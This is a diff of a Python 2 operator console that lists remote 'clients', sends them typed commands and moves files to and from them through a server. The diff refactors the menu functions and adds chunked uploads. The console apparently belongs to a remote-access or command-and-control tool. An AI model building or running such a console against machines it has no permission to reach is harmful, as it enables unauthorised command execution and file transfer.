@@ -2,8 +2,7 @@ from __future__ import print_function
 import requests
 import time
 import threading
-import json
-import os
+import os, sys, json, time
 
 # design constants
 # serverip = 'localhost'
@@ -43,38 +42,6 @@ def snipping():
             print(" ", end="\r")
             break
 
-# select options
-def let_user_pick(options):
-    animation_print("\nPlease choose action:")
-
-    for idx, element in enumerate(options):
-        animation_print("{}) {}".format(idx + 1, element))
-
-    while True:
-        i = raw_input("Enter number: ")
-        if i:
-            try:
-                if 0 < int(i) <= len(options):
-                    return int(i) - 1
-                else:
-                    animation_print("Please input number in list")
-            except:
-                animation_print("Please input number")
-
-# module to input client id
-def input_client():
-    while True:
-        client_id = raw_input("\ninput client id: ")
-        if client_id:
-            result = post({'action': actions[1]})
-            clients = json.loads(result)
-            if client_id in clients: 
-                break
-            else: 
-                animation_print('\n !!!Not exist, Please check list')
-                animation_print(result)
-    return client_id
-
 # get filename from filepath:
 def getFileName(filepath):
     x = filepath.rfind("/")
@@ -108,8 +75,87 @@ def animation_print(message, speed=0.02):
         time.sleep(speed)
     print()
 
+# load file by splite chunk size
+def read_in_chunks(file_object, CHUNK_SIZE):
+    while True:
+        data = file_object.read(CHUNK_SIZE)
+        if not data:
+            break
+        yield data
+
+# Upload file
+def upload(file, url, destfoler, client_id):
+    content_name = getFileName(file).replace("/", "\\")
+    content_path = os.path.abspath(file)
+    content_size = os.stat(content_path).st_size 
+    print(content_name, content_path, content_size)
+  
+    file_object = open(content_path, "rb")
+    index = 0
+    offset = 0
+    headers = {}
+    i=0
+    for chunk in read_in_chunks(file_object, 2048):
+        offset = index + len(chunk)
+        headers['Content-Range'] = 'bytes %s-%s/%s' % (index, offset - 1, content_size) 
+        index = offset 
+        try:         
+            file = {"myfile": chunk}
+            r = requests.post(
+                url, 
+                files=file, 
+                headers=headers, 
+                data={
+                    'action': 'upload', 
+                    'cma_msg': destfoler, 
+                    'client_id': client_id, 
+                    'chunk': i, 
+                    'chunks': content_size/2048+1
+                    }
+                )
+            i+=1
+            done = int(50 * offset / content_size)
+            sys.stdout.write("\r[%s%s]" % ('=' * done, ' ' * (50-done)) )    
+            sys.stdout.flush()
+        except Exception as e:
+            pass
+            sys.stdout.flush()
+    return 'success'
+
+# select options
+def main_menu(options):
+    animation_print("\nPlease choose action:")
+
+    for idx, element in enumerate(options):
+        animation_print("{}) {}".format(idx + 1, element))
+
+    while True:
+        i = raw_input("Enter number: ")
+        if i:
+            try:
+                if 0 < int(i) <= len(options):
+                    return int(i) - 1
+                else:
+                    animation_print("Please input number in list")
+            except:
+                animation_print("Please input number")
+
+# module to input client id
+def input_clinetId():
+    while True:
+        client_id = raw_input("\ninput client id: ")
+        if client_id:
+            result = post({'action': actions[1]})
+            clients = json.loads(result)
+            if client_id in clients: 
+                break
+            else: 
+                animation_print('\n !!!Not exist, Please check list')
+                animation_print(result)
+    return client_id
+
 # print welcome message
-def welcome_message():
+def welcome():
     print(" _       __________    __________  __  _________")
     print("| |     / / ____/ /   / ____/ __ \/  |/  / ____/")
     print("| | /| / / __/ / /   / /   / / / / /|_/ / __/")
@@ -118,11 +164,11 @@ def welcome_message():
 
 ############################## START MAIN FUNCTION #############################
 if __name__ == "__main__":
-    welcome_message()
+    welcome()
     while True:
         options = ["Get Clients List", "Execute Command", "Upload File", "Download File"]
         
-        res = let_user_pick(options)
+        res = main_menu(options)
         
         if options[res] == "Get Clients List":
             t1 = threading.Thread(target=snipping, args=())
@@ -134,7 +180,7 @@ if __name__ == "__main__":
             event.clear()
         
         elif options[res] == "Execute Command":
-            client_id = input_client()
+            client_id = input_clinetId()
             cma_msg = raw_input("input command: ")
             t1 = threading.Thread(target=snipping, args=())
             t1.start()
@@ -163,47 +209,14 @@ if __name__ == "__main__":
                 event.clear()
         
         elif options[res] == "Upload File":
-            client_id = input_client()
-            filepath = raw_input("input filepath or drag file: ")
+            client_id = input_clinetId()
+            filepath = raw_input("input filepath or drag file: ").replace("/", "\\")
             # print("input filepath %s" % cma_msg, end="")
-            try:
-                fo = open(filepath,'rb')
-                filename = getFileName(filepath).replace("/", "\\")
-                destpath = raw_input("input destination path: ").replace("/", "\\")
-                destfoler= getFolderName(destpath)
-                destfile = getFileName(destpath)
-                file = {'myfile': fo}
-                t1 = threading.Thread(target=snipping, args=())
-                t1.start()
-                r = requests.post(server_uri, files=file, data={'action': actions[3], 'cma_msg': destpath, 'client_id': client_id})
-                if r.status_code != 200:
-                    event.set()
-                    time.sleep(0.1)
-                    animation_print('\n sendErr: '+r.url)
-                else :
-                    # print('\n Successfully uploaded', r.text)
-                    while True:
-                        time.sleep(2)
-                        result = post({'action': actions[5], 'client_id': client_id})
-                        if (result.encode('utf8')[-2:] == 'ss'):
-                            # print(result)
-                            event.set()
-                            time.sleep(0.1)
-                            animation_print('\nsuccessfully uploaded')
-                            break
-                        elif (result.encode('utf8')[-2:] == 'or'):
-                            event.set()
-                            time.sleep(0.1)
-                            # print(result)
-                            animation_print('\nerror occured while uploading')
-                            break
-                event.clear()
-                fo.close()
-            except Exception as e:
-                animation_print("\n!!!Can't find that file\n")
+            destpath = raw_input("input destination path: ").replace("/", "\\")
+            res = upload(filepath, server_uri, destpath, client_id)
         
         elif options[res] == "Download File":
-            client_id = input_client()
+            client_id = input_clinetId()
             filepath  = raw_input("input filename: ").replace("/", "\\")
             filename  = getFileName(filepath)
 
